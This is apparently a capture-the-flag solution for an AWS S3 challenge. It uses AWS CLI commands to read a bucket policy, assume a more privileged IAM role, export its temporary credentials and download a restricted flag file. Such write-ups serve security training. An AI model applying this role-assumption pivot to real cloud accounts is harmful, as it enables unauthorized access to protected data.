# solution

- create a profile for the mrbuttons credentials (optional, could also set ENV vars)
  ```
  aws configure --profile mrbuttons
  ```

- list files
  `aws --profile mrbuttons s3 ls s3://cats-in-a-bucket`

- download files -> access denied for the one with the flag
  `aws --profile mrbuttons s3 cp s3://cats-in-a-bucket/cat1.jpg .`-> OK
  `aws --profile mrbuttons s3 cp s3://cats-in-a-bucket/cat2.jpg .`-> OK
  `aws --profile mrbuttons s3 cp s3://cats-in-a-bucket/cat3.jpg .`-> OK
  `aws --profile mrbuttons s3 cp s3://cats-in-a-bucket/cat4.jpg .`-> Access Denied

- hint about checking permissions -> get bucket policy
  ```
  aws --profile=mrbuttons s3api get-bucket-policy --bucket cats-in-a-bucket
  {
    "Policy": "{\"Version\":\"2008-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:user/misterbuttons\"},\"Action\":[\"s3:ListBucket\",\"s3:GetBucketPolicy\"],\"Resource\":\"arn:aws:s3:::cats-in-a-bucket\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:user/misterbuttons\"},\"Action\":\"s3:GetObject\",\"Resource\":[\"arn:aws:s3:::cats-in-a-bucket/cat1.jpg\",\"arn:aws:s3:::cats-in-a-bucket/cat2.jpg\",\"arn:aws:s3:::cats-in-a-bucket/cat3.jpg\"]},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:role/captainclaw\"},\"Action\":\"s3:ListBucket\",\"Resource\":\"arn:aws:s3:::cats-in-a-bucket\"},{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::261640479576:role/captainclaw\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::cats-in-a-bucket/cat4.jpg\"}]}"
  }
  ```

- role: `arn:aws:iam::261640479576:role/captainclaw`

- assume role
  ```
  aws --profile=mrbuttons sts assume-role --role-arn arn:aws:iam::261640479576:role/captainclaw --role-session-name captainclaw
  {
      "Credentials": {
        "AccessKeyId": "[...]",
        "SecretAccessKey": "[...]",
        "SessionToken": "[...]",
        "Expiration": "2022-10-09T16:46:29+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROATZ2X44NMIIMXFXIG7:captainclaw",
        "Arn": "arn:aws:sts::261640479576:assumed-role/captainclaw/captainclaw"
    }
  }

  export AWS_ACCESS_KEY_ID="[...VALUE_FROM_ABOVE...]"
  export AWS_SECRET_ACCESS_KEY="[...VALUE_FROM_ABOVE...]"
  export AWS_SESSION_TOKEN="[...VALUE_FROM_ABOVE...]"
  ```

- copy flag file -> without setting profile, using env vars of temp credentials here
  `aws s3 cp s3://cats-in-a-bucket/cat4.jpg .`


# creation
- run CloudFormation template (`cf-stack.yml`)
- updload cat1-cat4.jpg to bucket cats-in-a-bucket (root folder)
